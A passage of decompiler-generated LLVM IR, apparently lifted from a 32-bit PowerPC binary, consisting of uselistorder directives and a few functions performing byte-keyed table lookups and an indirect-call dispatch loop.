  uselistorder i32 %v2_100010d4, { 2, 1, 0, 3 }
  uselistorder i32 %v4_1000107c, { 0, 3, 2, 1, 4 }
  uselistorder i32 %v5_10001044, { 5, 0, 4, 3, 2, 1, 8, 7, 6, 9 }
  uselistorder i32 %v0_10001010, { 0, 2, 1 }
  uselistorder i32 %v4_1000100c, { 2, 1, 0, 3 }
  uselistorder i32 %v3_10000fe8, { 2, 1, 0, 3 }
  uselistorder i32 %v4_10000fdc, { 2, 1, 0, 3 }
  uselistorder i32 %v5_10000f84, { 0, 1, 5, 4, 3, 2, 8, 7, 6, 9 }
  uselistorder i32 %v3_10000f70, { 1, 0, 2, 3 }
  uselistorder i32 %v4_10000f2c, { 2, 1, 0, 3 }
  uselistorder i32 %v4_10000f00, { 2, 1, 0, 3 }
  uselistorder i32 %v5_10000eb8, { 0, 1, 5, 4, 3, 2, 8, 7, 6, 9 }
  uselistorder i32 %v3_10000ea4, { 1, 0, 2, 3 }
  uselistorder i32 %v4_10000e60, { 2, 1, 0, 3 }
  uselistorder i32 %v4_10000e2c, { 2, 1, 0, 3 }
  uselistorder i32 %v5_10000de4, { 0, 1, 5, 4, 3, 2, 8, 7, 6, 9 }
  uselistorder i32 %v3_10000dd0, { 1, 0, 2, 3 }
  uselistorder i32 %v4_10000d8c, { 2, 1, 0, 3 }
  uselistorder i32 %v4_10000d58, { 2, 1, 0, 3 }
  uselistorder i32 %v4_10000d2c, { 2, 1, 0, 3 }
  uselistorder i32 %v0_100017d4, { 2, 3, 4, 5, 0, 1 }
  uselistorder i32 %v5_10000ce8, { 2, 1, 0, 3 }
  uselistorder i32 %v4_10000cc4, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v2_10000c98, { 0, 3, 2, 1, 4 }
  uselistorder i32 %v1_10000c84, { 1, 0 }
  uselistorder i32 %v1_10000c6c, { 1, 0 }
  uselistorder i32 %v2_10000c5c, { 1, 0, 4, 3, 2, 5 }
  uselistorder i32 %v1_10000c54, { 1, 0 }
  uselistorder i32 %v1_10000c34, { 1, 0 }
  uselistorder i32 %v2_10000c20, { 1, 0, 3, 4, 5, 2 }
  uselistorder i32 %v3_10000bf4, { 2, 1, 0, 3 }
  uselistorder i32 %v1_10000b90, { 0, 3, 2, 1, 4 }
  uselistorder i32 %v3_10000b8c, { 2, 1, 0, 3 }
  uselistorder i32 %v3_10000b3c, { 0, 3, 2, 1, 4 }
  uselistorder i32 %v3_10000b18, { 0, 3, 2, 1, 4 }
  uselistorder i32 %v3_1000089c, { 2, 1, 0, 3 }
  uselistorder i32 %v1_10000870, { 1, 0 }
  uselistorder i32 %v1_10000858, { 2, 1, 0 }
  uselistorder i32 %v1_10000848, { 1, 0 }
  uselistorder i32 %v3_10000838, { 0, 3, 2, 1, 4 }
  uselistorder i32 %v1_10000824, { 2, 1, 0, 3 }
  uselistorder i1 %v3_1000081c, { 1, 0 }
  uselistorder i1 %v3_10000814, { 1, 0 }
  uselistorder i32 %v1_10000800, { 1, 0 }
  uselistorder i32 %v1_100007f0, { 1, 0 }
  uselistorder i32 %v0_100007b4, { 1, 0, 4, 3, 2 }
  uselistorder i32 %v1_10000788, { 1, 0 }
  uselistorder i32 %v1_10000784, { 2, 1, 0, 3 }
  uselistorder i32 %v1_10000768, { 1, 0 }
  uselistorder i32 %v2_10000758, { 1, 0, 4, 3, 2, 5 }
  uselistorder i32 %v3_100006cc, { 1, 0, 4, 3, 2, 5 }
  uselistorder i8 %v3_10000688, { 14, 15, 16, 17, 18, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i8* %v2_10000688, { 0, 1, 3, 2 }
  uselistorder i32 %v2_10000c8c, { 5, 6, 2, 3, 0, 1, 7, 4 }
  uselistorder i32 %v1_10000678, { 2, 1, 0, 3 }
  uselistorder i1 %v3_10000660, { 1, 0 }
  uselistorder i1 %v3_10000658, { 1, 0 }
  uselistorder i1 %v3_10000650, { 1, 0 }
  uselistorder i1 %v3_10000648, { 1, 0 }
  uselistorder i1 %v3_10000640, { 1, 0 }
  uselistorder i32 %v1_1000060c, { 1, 0 }
  uselistorder i32 %v1_100005ec, { 1, 0 }
  uselistorder i32 %v1_100005a0, { 1, 0 }
  uselistorder i32 %v3_10000590, { 0, 3, 2, 1, 4 }
  uselistorder i32 %v0_10000440., { 1, 2, 0 }
  uselistorder i32 %v1_10000418, { 1, 2, 3, 0 }
  uselistorder i32 %v3_10000404, { 1, 0, 4, 3, 2, 5 }
  uselistorder i32 %v2_10000400, { 2, 1, 0, 3 }
  uselistorder i32 %v2_100003e8, { 2, 1, 0, 3 }
  uselistorder i32 %v2_100003d8, { 2, 1, 0, 3 }
  uselistorder i32 %v0_1000038c, { 1, 0, 3, 2, 5, 4, 7, 6, 9, 8, 11, 10, 13, 12, 14, 15 }
  uselistorder i32 %v2_10000368, { 0, 3, 2, 1, 4 }
  uselistorder i32 %v0_1000035c, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v0_10000238, { 1, 0 }
  uselistorder i32 %v2_10000214, { 2, 1, 4, 3, 6, 5, 8, 7, 10, 9, 0, 11, 12 }
  uselistorder i32 %v1_100001f4, { 1, 0 }
  uselistorder i32* %stack_var_0, { 1, 0 }
  uselistorder i32* %r9.global-to-local, { 2, 3, 4, 6, 5, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 20, 19, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 73, 74, 75, 76, 51, 52, 53, 54, 57, 58, 55, 56, 59, 60, 61, 62, 64, 63, 1, 66, 65, 0, 67, 68, 69, 70, 71, 72 }
  uselistorder i32* %r4.global-to-local, { 0, 1, 2, 3, 4, 6, 7, 5, 8, 10, 9, 11, 12, 13, 15, 14, 16, 17, 18, 19, 20, 21, 22, 23, 24, 26, 25, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 51, 49, 50, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 67, 66, 68, 69, 70, 71, 73, 72, 74, 75, 76, 77, 78, 80, 79, 81, 82, 83, 84, 85, 87, 86, 89, 88, 91, 90, 92, 93, 94, 138, 139, 140, 141, 142, 143, 144, 145, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 127, 126, 128, 129, 130, 131, 132, 134, 133, 136, 135, 137, 146 }
  uselistorder i32* %r31.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 12, 11, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 25, 24, 26 }
  uselistorder i32* %r30.global-to-local, { 3, 5, 22, 23, 24, 25, 26, 6, 7, 8, 9, 10, 13, 11, 12, 2, 0, 14, 4, 15, 16, 17, 18, 19, 1, 20, 21, 27, 28, 29, 30, 31 }
  uselistorder i32* %r3.global-to-local, {}
  uselistorder i32* %r29.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 34, 21, 42, 43, 44, 7, 8, 9, 10, 12, 11, 13, 14, 15, 16, 17, 18, 45, 46, 47, 48, 49, 52, 50, 51, 53, 19, 20, 22, 23, 24, 25, 26, 27, 28, 29, 90, 36, 30, 31, 32, 33, 35, 37, 38, 39, 40, 41, 58, 54, 55, 56, 57, 59, 61, 60, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 99, 100, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 88, 87, 89, 91, 92, 93, 94, 95, 96, 97, 98 }
  uselistorder i32* %r28.global-to-local, { 0, 1, 36, 2, 3, 4, 5, 6, 7, 8, 13, 9, 10, 11, 12, 28, 29, 30, 16, 17, 18, 14, 15, 19, 20, 21, 22, 23, 24, 25, 26, 27, 31, 33, 32, 34, 35, 37, 38, 39, 41, 42, 40, 44, 43, 45 }
  uselistorder i32* %r27.global-to-local, { 28, 1, 0, 2, 7, 4, 8, 9, 3, 5, 23, 10, 12, 11, 13, 14, 15, 16, 6, 17, 18, 19, 20, 21, 22, 25, 24, 26, 29, 27, 30, 31 }
  uselistorder i32* %r26.global-to-local, { 0, 3, 1, 2, 4, 5, 6, 7, 9, 8, 12, 10, 11, 13, 14, 18, 15, 19, 16, 20, 17, 21, 23, 24, 22, 25, 26 }
  uselistorder i32* %r25.global-to-local, { 1, 2, 3, 0, 4, 5, 6, 7, 8, 9, 10, 13, 12, 15, 14, 16, 11, 17 }
  uselistorder i32* %r24.global-to-local, { 35, 3, 5, 6, 7, 8, 0, 1, 2, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 4, 27, 28, 29, 30, 31, 32, 33, 34, 36, 37, 38, 39 }
  uselistorder i32* %r23.global-to-local, { 2, 3, 4, 5, 6, 7, 8, 1, 9, 10, 11, 12, 13, 16, 17, 0, 14, 15, 18, 19, 21, 22, 20, 23 }
  uselistorder i32* %r22.global-to-local, { 45, 44, 46, 47, 48, 1, 49, 53, 50, 52, 51, 0, 54, 3, 2, 6, 4, 5, 7, 9, 8, 11, 10, 13, 12, 14, 15, 17, 16, 19, 18, 21, 20, 23, 22, 25, 24, 27, 26, 29, 28, 31, 30, 33, 32, 35, 34, 37, 36, 39, 38, 41, 40, 43, 42, 55, 57, 56, 58 }
  uselistorder i32* %r20.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 0, 31, 32 }
  uselistorder i32* %r19.global-to-local, { 5, 2, 3, 4, 6, 7, 8, 9, 0, 1 }
  uselistorder i32* %r18.global-to-local, { 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 18, 17, 19, 20, 21, 22, 0, 1 }
  uselistorder i32* %r17.global-to-local, { 2, 3, 4, 5, 6, 7, 0, 1 }
  uselistorder i32* %r16.global-to-local, { 2, 3, 4, 5, 0, 1 }
  uselistorder i32* %r15.global-to-local, { 2, 3, 4, 0, 1 }
  uselistorder i32* %r14.global-to-local, { 2, 3, 4, 0, 1 }
  uselistorder i32* %r11.global-to-local, { 2, 3, 4, 5, 6, 7, 8, 9, 11, 10, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 51, 52, 38, 37, 39, 40, 41, 42, 1, 43, 0, 44, 45, 46, 47, 48, 49, 50 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 2, 3, 4, 5, 7, 6, 8, 9, 12, 10, 11, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 50, 48, 49, 51, 52, 53, 55, 54, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 115, 116, 78, 80, 79, 81, 84, 82, 83, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 117, 118 }
  uselistorder i32* %lr.global-to-local, { 0, 1, 2, 3, 4, 6, 5, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 106, 107, 108, 109, 110, 111, 112, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 113, 114 }
  uselistorder i32* %ctr.global-to-local, { 3, 2, 1, 4, 5, 7, 6, 0, 8, 9, 10 }
  uselistorder i1* %cr7_lt.global-to-local, { 1, 2, 4, 3, 5, 8, 9, 10, 11, 6, 7, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 26, 25, 27, 28, 29, 30, 31, 32, 33, 34, 35, 0, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 59, 53, 54, 55, 56, 57, 58, 60, 61, 62, 64, 63, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 129, 130, 131, 97, 98, 103, 102, 99, 100, 101, 104, 105, 106, 107, 108, 109, 116, 117, 110, 111, 112, 113, 114, 115, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128 }
  uselistorder i1* %cr7_gt.global-to-local, { 1, 2, 4, 3, 5, 8, 9, 10, 11, 6, 7, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 25, 24, 26, 27, 28, 29, 30, 31, 32, 33, 34, 0, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 58, 52, 53, 54, 55, 56, 57, 59, 60, 61, 63, 62, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 129, 130, 131, 97, 98, 103, 102, 99, 100, 101, 104, 105, 106, 107, 108, 109, 116, 117, 110, 111, 112, 113, 114, 115, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128 }
  uselistorder i1* %cr7_eq.global-to-local, { 1, 2, 4, 3, 5, 8, 9, 10, 11, 6, 7, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 26, 25, 27, 28, 29, 30, 31, 32, 33, 34, 35, 0, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 60, 53, 54, 55, 56, 57, 58, 59, 61, 62, 63, 65, 64, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 131, 132, 133, 99, 100, 105, 104, 101, 102, 103, 106, 107, 108, 109, 110, 111, 118, 119, 112, 113, 114, 115, 116, 117, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130 }
  uselistorder i1* %cr3_eq.global-to-local, { 1, 0, 2 }
  uselistorder i32 268441368, { 1, 0 }
  uselistorder i8 34, { 3, 4, 5, 0, 1, 2, 6, 7, 8 }
  uselistorder i32 1579, { 0, 1, 2, 3, 5, 6, 7, 8, 9, 4, 10, 11, 12, 13 }
  uselistorder i32 ptrtoint ([5 x i8]* @global_var_1000a7dc.40 to i32), { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_1000a7d8.39 to i32), { 1, 0, 2 }
  uselistorder i32 931, { 0, 1, 2, 3, 5, 4, 6 }
  uselistorder i32 (i32, i32, i32, i32)* @function_100075a8, { 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 35, { 0, 3, 1, 4, 2, 5 }
  uselistorder i32 10240, { 2, 0, 1, 3, 4 }
  uselistorder i8 7, { 6, 7, 8, 9, 0, 1, 2, 3, 4, 5 }
  uselistorder i32 ptrtoint ([3 x i8]* @global_var_1000a7ac.24 to i32), { 0, 8, 1, 2, 3, 4, 5, 6, 9, 7, 10, 11 }
  uselistorder i32 3140, { 1, 2, 3, 4, 5, 0, 6 }
  uselistorder i32 43, { 0, 2, 1, 3 }
  uselistorder i32 39, { 0, 4, 1, 5, 2, 6, 3, 7 }
  uselistorder i32 37, { 0, 3, 1, 4, 2, 5 }
  uselistorder i32 ptrtoint ([4 x i8]* @global_var_1000a7b8.7 to i32), { 1, 2, 0 }
  uselistorder i32 268435604, { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_10001b0c, { 1, 0 }
  uselistorder label %dec_label_pc_10001a9c, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_100019dc, { 1, 0 }
  uselistorder label %dec_label_pc_100019ac, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000189c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10001870, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10001810, { 1, 0 }
  uselistorder label %dec_label_pc_10001758, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_10001708, { 1, 0 }
  uselistorder label %dec_label_pc_100016e4, { 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_10001680, { 1, 0 }
  uselistorder label %dec_label_pc_10001658, { 1, 0 }
  uselistorder label %dec_label_pc_10001600, { 1, 0 }
  uselistorder label %dec_label_pc_10001558, { 1, 0 }
  uselistorder label %dec_label_pc_100014d0, { 1, 0 }
  uselistorder label %dec_label_pc_10001364, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_1000133c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_100011f0, { 1, 0 }
  uselistorder label %dec_label_pc_100011e4, { 2, 3, 1, 7, 4, 5, 0, 6 }
  uselistorder label %dec_label_pc_100011a4, { 1, 0 }
  uselistorder label %dec_label_pc_100010f0, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_100010d0, { 1, 0 }
  uselistorder label %dec_label_pc_100010a0, { 1, 0 }
  uselistorder label %dec_label_pc_10001064, { 1, 0 }
  uselistorder label %dec_label_pc_10001024, { 1, 0 }
  uselistorder label %dec_label_pc_10000fe8, { 1, 0 }
  uselistorder label %dec_label_pc_10000fbc, { 1, 2, 0 }
  uselistorder label %dec_label_pc_10000f9c, { 1, 0 }
  uselistorder label %dec_label_pc_10000f14, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_10000ed0, { 1, 0 }
  uselistorder label %dec_label_pc_10000e40, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_10000dfc, { 1, 0 }
  uselistorder label %dec_label_pc_10000d6c, { 1, 0 }
  uselistorder label %dec_label_pc_10000d40, { 1, 0 }
  uselistorder label %dec_label_pc_10000cf4, { 1, 0 }
  uselistorder label %dec_label_pc_10000c00, { 1, 0 }
  uselistorder label %dec_label_pc_10000be8, { 1, 0 }
  uselistorder label %dec_label_pc_10000bb8, { 1, 0 }
  uselistorder label %dec_label_pc_10000b50, { 1, 0 }
  uselistorder label %dec_label_pc_10000b18, { 1, 0 }
  uselistorder label %dec_label_pc_100008b0, { 1, 0 }
  uselistorder label %dec_label_pc_10000824, { 7, 8, 2, 9, 0, 3, 10, 11, 12, 13, 14, 1, 15, 6, 4, 5 }
  uselistorder label %dec_label_pc_100007ec, { 1, 0 }
  uselistorder label %dec_label_pc_100006c0, { 1, 0 }
  uselistorder label %dec_label_pc_1000069c, { 1, 0 }
  uselistorder label %dec_label_pc_10000678, { 1, 2, 0, 3, 4 }
  uselistorder label %dec_label_pc_10000600.dec_label_pc_10000600_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_100005e0.dec_label_pc_100005e0_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_100005c4, { 3, 0, 1, 2, 4 }
  uselistorder label %dec_label_pc_100005c4.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_100005b4, { 1, 0 }
  uselistorder label %dec_label_pc_10000578, { 1, 0 }
  uselistorder label %dec_label_pc_10000530, { 1, 0 }
  uselistorder label %dec_label_pc_10000430, { 1, 0 }
}

define i32 @function_10001d50(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_10001d50:
  %ctr.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %arg1, i32* %ctr.global-to-local, align 4
  %v0_10001d5c = load i32, i32* @lr, align 4
  %tmp4 = icmp slt i32 %arg1, 1
  call void @__pseudo_cond_branch(i1 %tmp4, i32 %v0_10001d5c)
  %v1_10001d60 = add i32 %tmp, 4
  %v2_10001d60 = inttoptr i32 %v1_10001d60 to i8*
  %v3_10001d60 = load i8, i8* %v2_10001d60, align 1
  %v4_10001d60 = zext i8 %v3_10001d60 to i32
  %v4_10001d68 = icmp eq i32 %v4_10001d60, %arg3
  br i1 %v4_10001d68, label %dec_label_pc_10001d90, label %dec_label_pc_10001d84.preheader

dec_label_pc_10001d84.preheader:                  ; preds = %dec_label_pc_10001d50
  %v0_10001d88.pre = load i32, i32* %ctr.global-to-local, align 4
  br label %dec_label_pc_10001d84

dec_label_pc_10001d74:                            ; preds = %dec_label_pc_10001d84
  %v1_10001d74 = add i32 %v0_10001d74.in, 12
  %v2_10001d74 = inttoptr i32 %v1_10001d74 to i8*
  %v3_10001d74 = load i8, i8* %v2_10001d74, align 1
  %v4_10001d74 = zext i8 %v3_10001d74 to i32
  %v4_10001d7c = icmp eq i32 %v4_10001d74, %arg3
  br i1 %v4_10001d7c, label %dec_label_pc_10001d90, label %dec_label_pc_10001d84

dec_label_pc_10001d84:                            ; preds = %dec_label_pc_10001d84.preheader, %dec_label_pc_10001d74
  %v0_10001d88 = phi i32 [ %v0_10001d88.pre, %dec_label_pc_10001d84.preheader ], [ %v1_10001d88, %dec_label_pc_10001d74 ]
  %v0_10001d74.in = phi i32 [ %tmp, %dec_label_pc_10001d84.preheader ], [ %v0_10001d74, %dec_label_pc_10001d74 ]
  %v0_10001d74 = add i32 %v0_10001d74.in, 8
  %v1_10001d88 = add i32 %v0_10001d88, -1
  store i32 %v1_10001d88, i32* %ctr.global-to-local, align 4
  %v2_10001d88 = icmp eq i32 %v1_10001d88, 0
  br i1 %v2_10001d88, label %dec_label_pc_10001d8c, label %dec_label_pc_10001d74

dec_label_pc_10001d8c:                            ; preds = %dec_label_pc_10001d84
  ret i32 %arg4

dec_label_pc_10001d90:                            ; preds = %dec_label_pc_10001d74, %dec_label_pc_10001d50
  %v0_10001d90 = phi i32 [ %tmp, %dec_label_pc_10001d50 ], [ %v0_10001d74, %dec_label_pc_10001d74 ]
  %v1_10001d90 = inttoptr i32 %v0_10001d90 to i32*
  %v2_10001d90 = load i32, i32* %v1_10001d90, align 4
  ret i32 %v2_10001d90

; uselistorder directives
  uselistorder i32 %v1_10001d88, { 2, 1, 0 }
  uselistorder i32 %v0_10001d74.in, { 1, 0 }
  uselistorder i32 %tmp, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10001d84, { 1, 0 }
}

define i32 @function_10001d98(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
dec_label_pc_10001d98:
  store i32 %arg4, i32* @r28, align 4
  store i32 %arg3, i32* @r29, align 4
  store i32 %arg2, i32* @r30, align 4
  store i32 %arg1, i32* @r31, align 4
  store i32 268443096, i32* @lr, align 4
  %v0_10001dd4 = call i32 @function_10007db0()
  %v3_10001dd8 = icmp eq i32 %v0_10001dd4, -1
  br i1 %v3_10001dd8, label %dec_label_pc_10001de8, label %dec_label_pc_10001de0

dec_label_pc_10001de0:                            ; preds = %dec_label_pc_10001d98
  %tmp14 = icmp slt i32 %v0_10001dd4, 1
  br i1 %tmp14, label %dec_label_pc_10001e10, label %dec_label_pc_10001de8

dec_label_pc_10001de8:                            ; preds = %dec_label_pc_10001de0, %dec_label_pc_10001d98
  ret i32 %v0_10001dd4

dec_label_pc_10001e10:                            ; preds = %dec_label_pc_10001de0
  store i32 268443156, i32* @lr, align 4
  %v0_10001e10 = call i32 @function_10007db0()
  %v3_10001e14 = icmp eq i32 %v0_10001e10, -1
  br i1 %v3_10001e14, label %dec_label_pc_10001e38, label %dec_label_pc_10001e1c

dec_label_pc_10001e1c:                            ; preds = %dec_label_pc_10001e10
  %v3_10001e1c = icmp eq i32 %v0_10001e10, 0
  br i1 %v3_10001e1c, label %dec_label_pc_10001e24, label %dec_label_pc_10001e40

dec_label_pc_10001e24:                            ; preds = %dec_label_pc_10001e1c
  %v0_10001e24 = load i32, i32* @r31, align 4
  store i32 ptrtoint (i32* @global_var_10001e2c.56 to i32), i32* @lr, align 4
  %v1_10001e28 = call i32 @function_1000965c(i32 %v0_10001e24)
  store i32 268443184, i32* @lr, align 4
  %v0_10001e2c = call i32 @function_10007e40()
  store i32 ptrtoint ([3 x i8]* @global_var_10001e38.57 to i32), i32* @lr, align 4
  %v2_10001e34 = call i32 @function_10007e88(i32 %v0_10001e2c, i32 9)
  br label %dec_label_pc_10001e38

dec_label_pc_10001e38:                            ; preds = %dec_label_pc_10001e70, %dec_label_pc_10001e40, %dec_label_pc_10001e10, %dec_label_pc_10001e8c, %dec_label_pc_10001e24
  %v0_10001e3c = call i32 @function_100095d8()
  br label %dec_label_pc_10001e40

dec_label_pc_10001e40:                            ; preds = %dec_label_pc_10001e1c, %dec_label_pc_10001e38
  %v3_10001e44 = load i8, i8* @global_var_1001b28c.58, align 1
  %v3_10001e48 = icmp eq i8 %v3_10001e44, 0
  br i1 %v3_10001e48, label %dec_label_pc_10001e38, label %dec_label_pc_10001e50

dec_label_pc_10001e50:                            ; preds = %dec_label_pc_10001e40
  %v4_10001e44 = zext i8 %v3_10001e44 to i32
  %v3_10001e58 = load i32, i32* @global_var_1001b290.59, align 4
  %v1_10001e60 = inttoptr i32 %v3_10001e58 to i32*
  %v2_10001e60 = load i32, i32* %v1_10001e60, align 4
  %v1_10001e64 = add i32 %v2_10001e60, 4
  %v2_10001e64 = inttoptr i32 %v1_10001e64 to i8*
  %v3_10001e64 = load i8, i8* %v2_10001e64, align 1
  %v4_10001e64 = zext i8 %v3_10001e64 to i32
  %v1_10001e68 = load i32, i32* @r30, align 4
  %v4_10001e68 = icmp eq i32 %v4_10001e64, %v1_10001e68
  br i1 %v4_10001e68, label %dec_label_pc_10001e8c, label %dec_label_pc_10001e70

dec_label_pc_10001e70:                            ; preds = %dec_label_pc_10001e50, %dec_label_pc_10001e78
  %v0_10001e74 = phi i32 [ %v1_10001e74, %dec_label_pc_10001e78 ], [ %v4_10001e44, %dec_label_pc_10001e50 ]
  %v0_10001e70 = phi i32 [ %v1_10001e70, %dec_label_pc_10001e78 ], [ 0, %dec_label_pc_10001e50 ]
  %v1_10001e70 = add i32 %v0_10001e70, 1
  %v1_10001e74 = add i32 %v0_10001e74, -1
  %v2_10001e74 = icmp eq i32 %v1_10001e74, 0
  br i1 %v2_10001e74, label %dec_label_pc_10001e38, label %dec_label_pc_10001e78

dec_label_pc_10001e78:                            ; preds = %dec_label_pc_10001e70
  %v1_10001e78 = mul i32 %v1_10001e70, 4
  %v2_10001e7c = add i32 %v1_10001e78, %v3_10001e58
  %v3_10001e7c = inttoptr i32 %v2_10001e7c to i32*
  %v4_10001e7c = load i32, i32* %v3_10001e7c, align 4
  %v1_10001e80 = add i32 %v4_10001e7c, 4
  %v2_10001e80 = inttoptr i32 %v1_10001e80 to i8*
  %v3_10001e80 = load i8, i8* %v2_10001e80, align 1
  %v4_10001e80 = zext i8 %v3_10001e80 to i32
  %v4_10001e84 = icmp eq i32 %v4_10001e80, %v1_10001e68
  br i1 %v4_10001e84, label %dec_label_pc_10001e8c, label %dec_label_pc_10001e70

dec_label_pc_10001e8c:                            ; preds = %dec_label_pc_10001e78, %dec_label_pc_10001e50
  %v0_10001e8c = phi i32 [ %v2_10001e60, %dec_label_pc_10001e50 ], [ %v4_10001e7c, %dec_label_pc_10001e78 ]
  %v1_10001e8c = inttoptr i32 %v0_10001e8c to i32*
  %v2_10001e8c = load i32, i32* %v1_10001e8c, align 4
  call void @__pseudo_call(i32 %v2_10001e8c)
  br label %dec_label_pc_10001e38

; uselistorder directives
  uselistorder i32 %v1_10001e74, { 1, 0 }
  uselistorder i8 %v3_10001e44, { 1, 0 }
  uselistorder label %dec_label_pc_10001e70, { 1, 0 }
  uselistorder label %dec_label_pc_10001e40, { 1, 0 }
  uselistorder label %dec_label_pc_10001e38, { 3, 0, 1, 4, 2 }
}

define i32 @function_10001eac(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_10001eac:
  %cr4_eq.global-to-local = alloca i1, align 1
  %cr4_lt.global-to-local = alloca i1, align 1
  %ctr.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r20.global-to-local = alloca i32, align 4
  %r21.global-to-local = alloca i32, align 4
  %r22.global-to-local = alloca i32, align 4
  %r23.global-to-local = alloca i32, align 4
  %r25.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r3.global-to-local, align 4
  %v0_10001eac = call i32 @__asm_mfcr()
  store i32 %v0_10001eac, i32* %r3.global-to-local, align 4
  %v0_10001edc = load i32, i32* @r24, align 4
  %v0_10001ee4 = load i32, i32* @r26, align 4
  %v0_10001ee8 = load i32, i32* @r27, align 4
  %v0_10001eec = load i32, i32* @r28, align 4
  %tmp25 = icmp ult i32 %arg2, 4
  br i1 %tmp25, label %dec_label_pc_10001f0c, label %dec_label_pc_10001f00

dec_label_pc_10001f00:                            ; preds = %dec_label_pc_10001eac
  %v3_10001f00 = icmp eq i32 %arg2, 4
  %v1_10001f04 = inttoptr i32 %v0_10001eac to i32*
